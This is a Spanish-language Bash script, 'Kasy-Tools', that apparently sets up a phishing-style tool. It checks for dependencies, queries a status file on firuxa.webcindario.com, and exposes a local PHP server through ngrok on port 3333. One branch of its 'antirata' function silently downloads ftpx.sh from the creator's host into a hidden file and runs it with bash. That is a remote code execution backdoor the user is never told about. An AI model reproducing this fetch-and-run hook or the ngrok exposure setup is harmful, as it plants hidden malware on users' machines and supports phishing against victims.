#Kasy-Tools
inicio(){
#COLORES
#=====================================
clear

#COLOR DE FONDO 
frojo='\e[1;41m';
fverde='\e[1;42m';
famarillo='\e[1;43m';
fazul='\e[1;44m';
frosado='\e[1;45m';
fazulverdoso='\e[1;46m';
fblanco='\e[1;47m';
fin='\e[0m';


#COLOR DE LAS LETRAS

gris='\e[1;90m';
rojo='\e[1;91m';
verde='\e[1;92m';
amarillo='\e[1;93m';
azuloscuro='\e[1;94m';
rosa='\e[1;95m';
azulcielo='\e[1;96m';
blanco='\e[1;97m';
po=$(echo  "$verde[$blanco*$verde]$amarillo")
raya=$(echo -e -n "$rojo=========================================================$fin")
raya2=$(echo -e "     $rojo================================================$fin")
dia=$(date +%d)

#=====================================

#VERSION DE LA HERRAMIENTA
#=====================================

vs='1.0';

version=$(echo -e "      $amarillo|$verde Version - $vs $amarillo|$verde Actualizado - $dia Dic 2019 $amarillo|$verde")
derechos=$(echo -e "           $blanco$frojo Copyright - Firux S.A - Anony-K20 $fin")

#=====================================

figlet "          prueba "
echo "$raya"
echo "$version"
echo "$raya"
echo "$derechos"
echo "$raya2"

}
requisitos (){

#=====================================

#REQUISITOS
#=====================================


command -v figlet > /dev/null 2>&1 || { echo -e >&2 "$po$blanco Requisito$verde FIGLET$blanco no esta Instalado...."; 
echo -e "$po$blanco Por favor instale e intente Nuevamente...$fin"
exit 1; }

command -v php > /dev/null 2>&1 || { echo -e >&2 "$po$blanco Requisito$verde PHP$blanco no esta Instalado...."; 
echo -e "$po$blanco Por favor instale e intente Nuevamente...$fin"
exit 1; }

#=====================================

}
antirata(){
#=====================================
#PROTECCION
#=====================================

correou='randygreene802@gmail.com';
numu='3163076722';

host='firuxa.webcindario.com';

agente="Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-J321AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36";


estado=$(curl -i http://$host/files/msj.txt --user-agent "$agente" --silent | grep -o "Estado : [a-z]*" | cut -d " " -f3)

#=====================================

if [[ $estado == block ]]; then

echo -e "                $frojo ∆ Alerta de Seguridad ∆ $fin"
echo -e "$po Esta herramienta ha sido bloqueada por el creador ..!"
echo -e "$po Contactenos al siguiente correo :$verde $correou"
echo -e "$po Pagina de Facebook :$verde www.facebook.com/firuxsa"
echo -e "$po Whatsapp :$verde $numu"

echo -e "$po $rojo[1]$verde Usted tiene un Mensaje !$fin"

#=====================================
#TOMAR DECISION
#=====================================

echo -e -n "$po$blanco Deseas Leerlo ?$azulcielo [Y/N]$fin : "
read session

if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then

curl -l http://$host/files/msj.txt --user-agent "$agente" --silent
echo ""
else
figlet Ok !
exit
fi

#=====================================

elif [[ $estado == dblock ]]; then
primero
elif [[ $estado == ftp ]]; then

curl -o .tmp.sh http://$host/data8080/ftpx.sh --user-agent "$agente" --silent
bash .tmp.sh  
#=====================================

else
echo -e "$po$blanco Error al Conectarse con la Pagina..! "
echo -e "$po$verde Conectese a internet ..! $fin"
exit
fi
}
primero(){

#====================================#

port2="3333";
ruta=$(pwd | grep -o "sdcard" )
ruta2=$(pwd | grep -o "home" )


#permiso="home";
permiso="${ruta:-${ruta2}}"
if [[ $permiso == "home" ]]; then
echo -e "$po NGROK$rojo NO$blanco se Ejecutará !"
echo -e "$po Se detecto que esta herramienta esta en la$verde SDCARD !"
echo -e "$po Por favor Muevela a$verde HOME "
exit
elif [[ $permiso == "sdcard" ]]; then
echo -e "$po Ejecutando$verde NGROK"
chmod +x ngrok > /dev/null 2>&1 &
echo -e "$po Conectandose con$rosa Ngrok ..."
echo -e "$po$gris Espere$verde 10$blanco Segundos..."
ngrok http $port2 > /dev/null 2>&1 &
sleep 10
ngroklink
fi
}
ngroklink(){
engrok=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")

if [[ $engrok ]]; then
enlaces
else
echo -e "$po Error al$rojo NO$blanco se pudo generar el Link"
echo -e "$po$azuloscuro Reintentando ...."
echo -e "$po Conectandose con$verde Ngrok ..."
echo -e "$po$gris Espere$verde 15$blanco Segundos..."
ngrok http $port2 > /dev/null 2>&1 &
sleep 15
ngroklink
fi


#====================================#

}
enlaces(){
echo "$po $engrok"
}
inicio
requisitos
antirata
